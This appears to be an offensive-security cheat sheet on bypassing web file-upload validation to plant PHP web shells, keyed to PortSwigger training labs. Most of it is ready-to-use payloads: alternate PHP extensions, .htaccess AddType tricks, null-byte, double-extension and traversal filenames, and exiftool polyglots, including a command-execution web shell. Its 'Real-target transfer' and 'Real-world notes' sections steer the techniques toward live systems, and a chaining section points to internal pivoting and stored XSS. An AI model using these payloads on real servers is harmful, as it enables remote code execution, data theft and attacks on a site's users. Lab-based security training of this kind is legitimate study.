# File upload — Bypasses (path traversal, blacklist, obfuscation, polyglot)

When validation blocks a plain `.php`, defeat it: escape a non-executable upload dir with **path traversal**, slip past an **extension blacklist** (`.phtml`, `.htaccess`), **obfuscate** the extension (multiple dots, case, null byte), or smuggle PHP inside a real image (**polyglot**) to beat content checks. Outcome: web shell RCE.

## Quick reference
```
# extension blacklist bypass (PHP alt extensions the server still executes)
exploit.phtml  exploit.php3  exploit.php4  exploit.php5  exploit.php7  exploit.phar  exploit.pht
# or upload an .htaccess to make a benign ext executable:
.htaccess:  AddType application/x-httpd-php .l33t      -> then upload exploit.l33t
# obfuscation
exploit.php.jpg        exploit.pHp        exploit.php%00.jpg     exploit.php%2500.jpg
exploit.php.            exploit.php;.jpg   exploit.asp;.jpg
# path traversal (upload dir not executable; escape to one that is)
filename=../exploit.php       filename=..%2fexploit.php
# content/magic-byte check -> polyglot (valid JPG + PHP in metadata)
exiftool -Comment='<?php echo file_get_contents("/home/carlos/secret"); ?>' img.jpg -o exploit.php
```

## Root cause
Each validation layer disagrees with how the OS/web server resolves the file: blacklists miss alternate executable extensions; filename parsers differ from the filesystem (null byte, double extension, traversal); content checks only inspect magic bytes, not appended/metadata code.

## Technique
**Extension blacklist bypass:** the server blocks `.php` but executes other PHP extensions. Try `.phtml`, `.php3/4/5/7`, `.phar`, `.pht`, `.shtml`. Or upload a config file: `.htaccess` with `AddType application/x-httpd-php .xxx` (Apache) / `web.config` (IIS) → then upload `shell.xxx`.

**Obfuscated extension:**
- **Double extension:** `exploit.php.jpg` (some configs execute on `.php` anywhere) or `exploit.jpg.php`.
- **Case:** `exploit.pHp` (blacklist case-sensitive).
- **Null byte:** `exploit.php%00.jpg` — the validator sees `.jpg`, the filesystem stops at `%00` → `exploit.php` (older stacks). Try double-encoded `%2500`.
- **Trailing chars/separators:** `exploit.php.`, `exploit.php%20`, `exploit.php;.jpg`.

**Path traversal:** the upload dir isn't executable, but you can write elsewhere. Put traversal in the filename: `filename=../exploit.php` (URL-encode if stripped: `..%2f`). The file lands in a parent dir that *does* execute PHP.

**Polyglot (content/magic-byte bypass):** the server verifies the file is a real image. Embed PHP in image metadata so the file is a valid JPG **and** contains your payload: `exiftool -Comment='<?php ... ?>' input.jpg -o exploit.php`. If the server executes by extension, the PHP in the comment runs when requested.

**Advanced / edge:** combine (traversal + alt extension); strip-then-reinsert (`exploit.p.phphp` → after one strip = `exploit.php`); use the `GET` of the stored file with the bypass extension if the validator only checks the upload POST.

## Payload arsenal
```
exploit.phtml | .php5 | .phar | .pht | .shtml
.htaccess  ->  AddType application/x-httpd-php .l33t
filename="../exploit.php"            filename="..%2fexploit.php"
exploit.php.jpg | exploit.pHp | exploit.php%00.jpg | exploit.php%2500.jpg
exiftool -Comment='<?php system($_GET["c"]); ?>' cat.jpg -o exploit.php
```

## Bypasses
| Defense | Bypass |
|---|---|
| blocks `.php` | `.phtml`/`.php5`/`.phar`; `.htaccess` AddType |
| allowlist by extension | null byte / double extension / case |
| non-executable upload dir | path traversal `../` in filename |
| magic-byte/content check | polyglot (PHP in image metadata) |

## Exploitation walkthrough (path traversal)
1. `.php` uploads but the avatar dir doesn't execute PHP (served as text).
2. Set `filename=../exploit.php` (or `..%2fexploit.php` if `../` stripped) → file written one dir up (executable).
3. `GET /files/avatars/../exploit.php` (or the resolved path) → PHP runs → secret → solved.

## Bypasses table → labs

## Labs

### Web shell upload via path traversal [Practitioner]
URL: .../lab-file-upload-web-shell-upload-via-path-traversal — `filename=../exploit.php` to escape a non-exec dir. Insight: traversal places the shell where PHP executes.

### Web shell upload via extension blacklist bypass [Practitioner]
URL: .../lab-file-upload-web-shell-upload-via-extension-blacklist-bypass — `.php` blocked; upload `.htaccess` (`AddType ... .l33t`) then `exploit.l33t`, or use `.phtml`. Insight: blacklists miss alt extensions / config files.

### Web shell upload via obfuscated file extension [Practitioner]
URL: .../lab-file-upload-web-shell-upload-via-obfuscated-file-extension — `exploit.php%00.jpg` (null byte) passes the allowlist but stores as `.php`. Insight: validator vs filesystem disagree on the name.

### RCE via polyglot web shell upload [Practitioner]
URL: .../lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload — `exiftool -Comment='<?php ... ?>' img.jpg -o exploit.php`; passes image content check, executes as PHP. Insight: a file can be a valid image AND a web shell.

Real-target transfer: ladder Content-Type → alt extension → `.htaccess` → null-byte/double-ext → path-traversal → polyglot until a shell executes.

## Chaining
- Bypass → webshell → **RCE** → internal/cloud pivot ([OS-command-injection](../../OS-command-injection/), [SSRF](../../SSRF/)).
- SVG/HTML upload served on-origin → **stored XSS** → attack other users ([XSS](../../XSS/), [objectives: attack-others](../../references/objectives-attack-trees.md)).
- See [chaining-playbook → File upload→webshell→RCE](../../references/chaining-playbook.md).

## Real-world notes
- `.phtml`/`.phar` and `.htaccess` AddType are very effective against real blacklists.
- Polyglots evade content scanners and "image-only" gates; common in real RCE chains.
- Null-byte needs older runtimes but still found.

## References
- https://portswigger.net/web-security/file-upload
